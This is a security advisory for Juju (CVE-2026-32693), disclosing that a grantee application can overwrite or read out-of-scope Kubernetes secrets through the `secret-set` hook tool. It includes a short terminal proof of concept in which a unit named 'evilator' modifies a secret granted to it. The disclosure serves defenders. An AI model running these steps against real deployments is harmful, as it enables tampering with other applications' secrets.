# [H] Juju has unauthorized access to out-of-scope Kubernetes secrets

## Summary
Severity: High
Advisory: GHSA-439w-v2p7-pggc
CVE: CVE-2026-32693
CWE: CWE-284
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-19
Source: https://github.com/advisories/GHSA-439w-v2p7-pggc
Type: github-advisory

## Affected
- Go: `github.com/juju/juju` — affected >=0.0.0-20221021155847-35c560704ee2 <0.0.0-20260319091847-d06919eb03ec

## Details
### Summary

Grantee is able to update secret content using the `secret-set` tool due to broad Kubernetes access policy.
Implications are that it is possible, knowing a Kubernetes secret identifier (e.g. name), to patch without affecting the secret, revealing the value, or, patching while affecting the secrets value.

### Details

When a Juju secret is "granted" to an app, that app should be able to read the secret content but not modify it, and should be able to only read secrets that have been granted to it.

Authorization of the `secret-set` hook tool / controller request is not performed correctly, which allows the grantee to update the secret content and to read or affect other secrets.

### PoC

Tested:
- two applications in the same controller, same model: one owns the secret, another get a grant
- relation between them
- secret grant
- Linux AMD64, Canonical K8s, Juju 3.6.8 controller, Juju 3.6.9 CLI

Not tested:
- admin (user) secrets
- cross-model relations
- cross-controller relations

```command
⋊> dima@bb ⋊> /c/hexanator on main ◦ juju exec --unit ingress2/0 "secret-add nice=little-value"
secret://9cf1319c-4f4b-44f8-891b-9d1c7d8d3b52/d350nbnmp25c76301ht0
⋊> dima@bb ⋊> /c/hexanator on main ◦ juju show-unit ingress2/0
ingress2/0:
  workload-version: 24.2.0
  opened-ports: []
  charm: ch:amd64/nginx-ingress-integrator-203
  leader: true
  life: alive
  relation-info:
  - relation-id: 11
    endpoint: ingress
    related-endpoint: ingress
    application-data: {}
    related-units:
      evilator/0:
        in-scope: true
        data:
          egress-subnets: 10.152.183.39/32
          ingress-address: 10.152.183.39
          private-address: 10.152.183.39
  - relation-id: 10
    endpoint: nginx-peers
    related-endpoint: nginx-peers
    application-data: {}
    local-unit:
      in-scope: true
      data:
        egress-subnets: 10.152.183.135/32
        ingress-address: 10.152.183.135
        private-address: 10.152.183.135
  provider-id: ingress2-0
  address: 10.1.0.100
⋊> dima@bb ⋊> /c/hexanator on main ◦ juju exec --unit ingress2/0 "secret-grant d350nbnmp25c76301ht0 --relation 11" 
⋊> dima@bb ⋊> /c/hexanator on main ◦ juju exec --unit evilator/0 "secret-set d350nbnmp25c76301ht0 nice=who-is-nice-now" 
updating secrets: permission denied
⋊> dima@bb ⋊> /c/hexanator on main ◦ juju exec --unit ingress2/0 "secret-get d350nbnmp25c76301ht0" 
nice: who-is-nice-now
```

When the grantee attempts to update the the granted secret:

- `secret-set` command logs an error, though returns OK return status
- the secret value is updated
- new secret revision is not created
- new value is visible to both owner and grantee

### Impact

- the application that owns the secret
- a third application, if a secret is granted to multiple parties
- any other application that has secrets in the same Kubernetes secret backend

## References
- https://github.com/juju/juju/security/advisories/GHSA-439w-v2p7-pggc
- https://nvd.nist.gov/vuln/detail/CVE-2026-32693
- https://github.com/juju/juju/commit/d06919eb03ec68156818bcc304b5fe1c39a8f9e9
- https://github.com/juju/juju
